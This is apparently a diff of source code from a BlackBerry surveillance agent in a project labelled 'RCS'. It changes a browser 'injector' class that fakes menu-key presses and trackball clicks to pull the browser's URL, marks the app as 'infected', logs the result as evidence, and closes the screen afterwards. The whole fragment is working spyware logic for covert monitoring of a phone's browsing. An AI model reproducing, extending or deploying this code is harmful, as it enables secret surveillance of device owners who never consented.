@@ -6,12 +6,13 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
 
 package blackberry.agent.url;
 
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Keypad;
+import net.rim.device.api.ui.Screen;
+import net.rim.device.api.ui.UiApplication;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -29,10 +30,10 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
 
     private static AppInjectorBrowser instance;
     private static final long GUID = 0xa2b7338e410f087bL;
-    private static final int DELAY = 5000;
+    private static final int DELAY = 10000;
     private static final int MAX_TRIES = 8;
 
-    private int tries =0;
+    private int tries = 0;
     private int delay = 200;
     boolean infected;
 
@@ -66,30 +67,51 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
 
     public boolean callMenuByKey() {
 
+        Screen screen = UiApplication.getUiApplication().getActiveScreen();
+
         //#ifdef DEBUG
-        debug.info("calling browser menu");
+        debug.info("calling browser menu: " + screen);
+        if (screen != null) {
+            debug.trace("application: " + screen.getApplication());
+            debug.trace("menu: " + screen.getMenu(0));
+        }
         //#endif
-        
+
         tries++;
-        if(tries >= MAX_TRIES){
+        if (tries >= MAX_TRIES) {
             //#ifdef DEBUG
             debug.error("callMenuByKey: too many tries");
             //#endif
-            if(tries == MAX_TRIES){
+            if (tries == MAX_TRIES) {
                 Evidence.info("NO URL");
             }
             return false;
         }
 
         //#ifdef DEBUG
-        debug.trace("callMenuByKey press raw key: " + tries);
+        debug.trace("callMenuByKey press menu key, try: " + tries);
         //#endif
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
         Utils.sleep(delay + tries * 20);
-        KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
+        if (true) {
+            //#ifdef DEBUG
+            debug.trace("callMenuByKey: pressRawKey");
+            //#endif
+            KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
+        } else {
+            //#ifdef DEBUG
+            debug.trace("callMenuByKey: pressKey");
+            //#endif
+            KeyInjector.pressKey(menu.toString().toLowerCase().charAt(0));
+        }
         Utils.sleep(delay + tries * 20);
         KeyInjector.trackBallRawClick();
+        //Utils.sleep(delay + tries * 20);
+        //KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
 
+        if (screen != null) {
+            screen.close();
+        }
         return true;
     }
 
@@ -107,14 +129,14 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
     }
 
     public void setInfected(boolean value) {
-        if(value){
+        if (value) {
             Evidence.info("URL");
         }
         infected = true;
     }
 
     public int getDelay() {
-       
+
         return DELAY;
     }
 
